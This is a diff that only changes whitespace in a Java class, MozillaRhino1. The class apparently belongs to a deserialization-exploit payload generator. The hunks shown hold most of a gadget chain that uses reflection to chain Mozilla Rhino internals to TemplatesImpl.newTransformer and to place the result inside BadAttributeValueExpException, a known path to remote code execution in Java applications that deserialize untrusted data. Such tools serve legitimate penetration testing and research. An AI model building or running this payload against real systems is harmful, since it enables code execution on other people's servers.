@@ -28,7 +28,7 @@ public class MozillaRhino1 implements ObjectPayload<Object> {
     }
 
     public Object getObject(String command) throws Exception {
-        Class       nativeErrorClass       = Class.forName("org.mozilla.javascript.NativeError");
+        Class nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
         Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
         Reflections.setAccessible(nativeErrorConstructor);
         IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();
@@ -37,21 +37,21 @@ public class MozillaRhino1 implements ObjectPayload<Object> {
 
         NativeObject scriptableObject = (NativeObject) context.initStandardObjects();
 
-        Method           enterMethod = Context.class.getDeclaredMethod("enter");
-        NativeJavaMethod method      = new NativeJavaMethod(enterMethod, "name");
+        Method enterMethod = Context.class.getDeclaredMethod("enter");
+        NativeJavaMethod method = new NativeJavaMethod(enterMethod, "name");
         idScriptableObject.setGetterOrSetter("name", 0, method, false);
 
-        Method           newTransformer   = TemplatesImpl.class.getDeclaredMethod("newTransformer");
+        Method newTransformer = TemplatesImpl.class.getDeclaredMethod("newTransformer");
         NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, "message");
         idScriptableObject.setGetterOrSetter("message", 0, nativeJavaMethod, false);
 
         Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
         Reflections.setAccessible(getSlot);
-        Object slot   = getSlot.invoke(idScriptableObject, "name", 0, 1);
-        Field  getter = slot.getClass().getDeclaredField("getter");
+        Object slot = getSlot.invoke(idScriptableObject, "name", 0, 1);
+        Field getter = slot.getClass().getDeclaredField("getter");
         Reflections.setAccessible(getter);
 
-        Class       memberboxClass            = Class.forName("org.mozilla.javascript.MemberBox");
+        Class memberboxClass = Class.forName("org.mozilla.javascript.MemberBox");
         Constructor memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);
         Reflections.setAccessible(memberboxClassConstructor);
         Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
@@ -64,7 +64,7 @@ public class MozillaRhino1 implements ObjectPayload<Object> {
         idScriptableObject.setPrototype(nativeObject);
 
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
-        Field                         valField                      = badAttributeValueExpException.getClass().getDeclaredField("val");
+        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
         Reflections.setAccessible(valField);
         valField.set(badAttributeValueExpException, idScriptableObject);
         return badAttributeValueExpException;
